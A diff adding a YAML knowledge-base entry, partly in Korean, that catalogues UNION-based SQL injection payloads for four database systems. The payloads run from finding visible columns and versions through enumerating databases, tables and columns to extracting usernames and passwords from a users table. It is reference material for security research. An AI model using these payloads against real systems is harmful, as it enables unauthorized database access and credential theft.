@@ -1,0 +1,174 @@
+# GR-SEC-INS-P0005: UNION Data Extraction Payload
+
+identity:
+  id: GR-SEC-INS-P0005
+  name: "UNION Data Extraction Payload"
+  normalization:
+    normalized_name: "union data extraction payload"
+    normalization_version: "1.0"
+  aliases:
+    - "UNION SELECT Data"
+    - "Information Schema Query"
+    - "데이터 추출"
+
+classification:
+  domain: security
+  type: payload
+  abstraction_level: 1
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-EXPLOIT"
+
+definition:
+  what: |
+    UNION SELECT를 이용하여 데이터베이스의 메타데이터
+    (테이블, 컬럼)와 실제 데이터를 추출하는 페이로드이다.
+  why: |
+    UNION 컬럼 수를 파악한 후, 원하는 데이터를 SELECT하여
+    응답에 포함시킬 수 있다. 대량의 데이터를 빠르게
+    추출할 수 있는 가장 효율적인 방법이다.
+
+payload:
+  # 표시 가능한 컬럼 위치 확인
+  visible_column_finder:
+    mysql: "' UNION SELECT 1,2,3,4,5--"
+    mssql: "' UNION SELECT 1,2,3,4,5--"
+    oracle: "' UNION SELECT 1,2,3,4,5 FROM dual--"
+    postgresql: "' UNION SELECT 1,2,3,4,5--"
+
+  # DBMS 버전 확인
+  version_extraction:
+    mysql: "' UNION SELECT 1,@@version,3,4,5--"
+    mssql: "' UNION SELECT 1,@@version,3,4,5--"
+    oracle: "' UNION SELECT 1,banner,3,4,5 FROM v$version--"
+    postgresql: "' UNION SELECT 1,version(),3,4,5--"
+
+  # 데이터베이스 목록
+  database_enumeration:
+    mysql: |
+      ' UNION SELECT 1,schema_name,3,4,5
+      FROM information_schema.schemata--
+    mssql: |
+      ' UNION SELECT 1,name,3,4,5
+      FROM master.sys.databases--
+    oracle: |
+      ' UNION SELECT 1,owner,3,4,5
+      FROM all_tables--
+    postgresql: |
+      ' UNION SELECT 1,datname,3,4,5
+      FROM pg_database--
+
+  # 테이블 목록
+  table_enumeration:
+    mysql: |
+      ' UNION SELECT 1,table_name,3,4,5
+      FROM information_schema.tables
+      WHERE table_schema=database()--
+    mssql: |
+      ' UNION SELECT 1,name,3,4,5
+      FROM sysobjects WHERE xtype='U'--
+    oracle: |
+      ' UNION SELECT 1,table_name,3,4,5
+      FROM all_tables WHERE owner='SCHEMA'--
+    postgresql: |
+      ' UNION SELECT 1,tablename,3,4,5
+      FROM pg_tables WHERE schemaname='public'--
+
+  # 컬럼 목록
+  column_enumeration:
+    mysql: |
+      ' UNION SELECT 1,column_name,3,4,5
+      FROM information_schema.columns
+      WHERE table_name='users'--
+    mssql: |
+      ' UNION SELECT 1,name,3,4,5
+      FROM syscolumns WHERE id=OBJECT_ID('users')--
+    oracle: |
+      ' UNION SELECT 1,column_name,3,4,5
+      FROM all_tab_columns WHERE table_name='USERS'--
+    postgresql: |
+      ' UNION SELECT 1,column_name,3,4,5
+      FROM information_schema.columns
+      WHERE table_name='users'--
+
+  # 데이터 추출
+  data_extraction:
+    mysql: "' UNION SELECT 1,username,password,4,5 FROM users--"
+    generic_concat: |
+      ' UNION SELECT 1,CONCAT(username,':',password),3,4,5
+      FROM users--
+
+relations:
+  structural:
+    instance_of:
+      - GR-SEC-TEC-00001  # UNION-based SQLi
+  conditional:
+    requires:
+      - GR-SEC-INS-P0004  # Column count determined
+    used_with:
+      - GR-SEC-INS-F0001  # MySQL fingerprint
+      - GR-SEC-INS-F0002  # MSSQL fingerprint
+
+constraints:
+  - property: effectiveness
+    base_value: 0.9
+    conditions:
+      - when:
+          context_type: display
+          condition: "no_visible_columns == true"
+        then:
+          value: 0.0
+          reason: "표시되는 컬럼이 없으면 데이터 확인 불가"
+
+properties:
+  security:
+    severity: high
+    purpose: exploitation
+    data_types_extractable:
+      - "database version"
+      - "database names"
+      - "table names"
+      - "column names"
+      - "actual data"
+    dbms_specific: true
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: manual
+      source_uri: "internal://gr-sqli-payloads"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_authoring"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: medium
+  ai:
+    embedding_text: |
+      UNION Data Extraction Payload는 UNION SELECT로 DB
+      메타데이터와 데이터를 추출하는 페이로드이다.
+      information_schema(MySQL), sysobjects(MSSQL) 등을
+      사용하여 테이블, 컬럼 구조를 파악하고 실제 데이터를
+      추출한다. 컬럼 수 파악이 선행되어야 하며 DBMS별로
+      쿼리 문법이 다르다.
+    search_keywords:
+      - "UNION SELECT"
+      - "information_schema"
+      - "data extraction"
+      - "table enumeration"
+      - "데이터 추출"
